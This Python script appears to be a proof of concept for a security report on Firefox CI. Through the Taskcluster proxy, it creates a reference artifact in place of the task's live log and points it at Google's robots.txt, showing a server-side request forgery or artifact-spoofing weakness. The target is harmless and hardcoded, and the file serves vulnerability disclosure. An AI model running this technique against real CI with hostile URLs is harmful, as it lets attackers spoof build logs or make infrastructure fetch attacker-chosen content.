#!/usr/bin/env python3
"""Create the benign reference artifact used by the live workflow proof.

Run only inside the fork-controlled Firefox CI pull-request task. Generic Worker
provides TASKCLUSTER_PROXY_URL, TASK_ID, and RUN_ID. The destination is hardcoded
to Google's public robots.txt and includes the task ID solely as a cache-busting
query value. This script cannot be used to select a private or arbitrary target.
"""

from __future__ import annotations

import datetime
import json
import os
import urllib.parse
import urllib.request

ARTIFACT_NAME = "public/logs/live_backing.log"
GOOGLE_ROBOTS = "https://www.google.com/robots.txt"


def required_env(name: str) -> str:
    value = os.environ.get(name)
    if not value:
        raise SystemExit(f"missing required task environment variable: {name}")
    return value


def main() -> int:
    proxy_url = required_env("TASKCLUSTER_PROXY_URL").rstrip("/")
    task_id = required_env("TASK_ID")
    run_id = required_env("RUN_ID")

    target_url = GOOGLE_ROBOTS + "?" + urllib.parse.urlencode(
        {"tc-reference-artifact-ssrf": task_id}
    )
    expires = (
        datetime.datetime.now(datetime.timezone.utc)
        + datetime.timedelta(minutes=30)
    ).isoformat(timespec="milliseconds").replace("+00:00", "Z")

    artifact_url = (
        f"{proxy_url}/api/queue/v1/task/"
        f"{urllib.parse.quote(task_id, safe='')}/runs/"
        f"{urllib.parse.quote(run_id, safe='')}/artifacts/{ARTIFACT_NAME}"
    )
    request_body = json.dumps(
        {
            "storageType": "reference",
            "expires": expires,
            "contentType": "text/plain",
            "url": target_url,
        }
    ).encode()
    request = urllib.request.Request(
        artifact_url,
        data=request_body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    with urllib.request.urlopen(request, timeout=30) as response:
        response_body = response.read().decode("utf-8", "replace")
        if response.status not in (200, 201):
            raise RuntimeError(
                f"createArtifact returned HTTP {response.status}: {response_body}"
            )

    print(f"created {ARTIFACT_NAME}")
    print(f"reference target: {target_url}")
    print(f"Queue response: HTTP {response.status} {response_body}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())